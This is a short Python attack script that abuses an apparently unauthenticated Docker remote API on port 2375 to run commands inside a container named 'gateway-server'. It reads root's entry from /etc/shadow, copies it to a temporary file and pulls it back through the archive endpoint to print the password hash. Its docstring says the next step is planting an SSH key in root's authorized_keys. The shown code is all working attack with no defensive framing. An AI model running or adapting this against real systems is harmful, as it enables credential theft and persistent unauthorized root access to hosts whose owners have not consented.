"""
Check root password and use key-based auth
Generate SSH key, add to authorized_keys for root
"""
import urllib.request, json, time
URL = 'http://172.16.0.40:2375'

# Check root account
body = json.dumps({"Cmd": ["sh", "-c", "cat /etc/shadow | grep root > /tmp/p.log 2>&1; getent passwd root >> /tmp/p.log 2>&1"]}).encode()
req = urllib.request.Request(f'{URL}/containers/gateway-server/exec', data=body, headers={'Content-Type': 'application/json'}, method='POST')
r = urllib.request.urlopen(req)
eid = json.loads(r.read())['Id']
urllib.request.urlopen(urllib.request.Request(f'{URL}/exec/{eid}/start', data=b'{"Tty":false}', headers={'Content-Type': 'application/json'}, method='POST')).read()
time.sleep(3)
r = urllib.request.urlopen(f'{URL}/containers/gateway-server/archive?path=/tmp/p.log', timeout=10)
data = r.read()
sz = int(data[124:136].rstrip(b'\x00').rstrip(b' ').decode('utf-8'), 8) if data[124:136].rstrip(b'\x00').rstrip(b' ').decode('utf-8') else 0
print("=== root account ===")
print(data[512:512+sz].decode('utf-8', errors='replace'))
